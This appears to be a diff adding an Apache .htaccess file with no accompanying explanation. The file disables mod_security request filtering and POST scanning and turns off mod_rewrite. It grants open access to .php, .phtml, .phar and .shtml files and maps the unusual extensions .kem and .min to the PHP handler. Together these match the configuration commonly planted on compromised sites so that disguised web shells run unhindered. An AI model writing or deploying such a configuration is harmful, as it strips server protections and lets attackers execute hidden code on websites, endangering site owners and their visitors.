@@ -1,0 +1,58 @@
+<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine Off
+</IfModule>
+
+<IfModule mod_authz_core.c>
+    <FilesMatch "\.php$">
+    Require all granted
+    </FilesMatch>
+</IfModule>
+<FilesMatch "\.php$">
+    Order allow,deny
+    allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+    RewriteEngine Off
+</IfModule>
+
+<IfModule mod_authz_core.c>
+    <FilesMatch "\.php$">
+    Require all granted
+    </FilesMatch>
+</IfModule>
+<FilesMatch "\.phtml$">
+    Order allow,deny
+    allow from all
+</FilesMatch>
+
+
+<IfModule mod_authz_core.c>
+    <FilesMatch "\.phtml$">
+    Require all granted
+    </FilesMatch>
+</IfModule>
+<FilesMatch "\.php$">
+    Order allow,deny
+    allow from all
+</FilesMatch>
+<IfModule mod_authz_core.c>
+    <FilesMatch "\.phar$">
+    Require all granted
+    </FilesMatch>
+</IfModule>
+<FilesMatch "\.shtml$">
+    Order allow,deny
+    allow from all
+</FilesMatch>
+<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>
+AddType application/x-httpd-php .kem
+AddType application/x-httpd-php .min
+
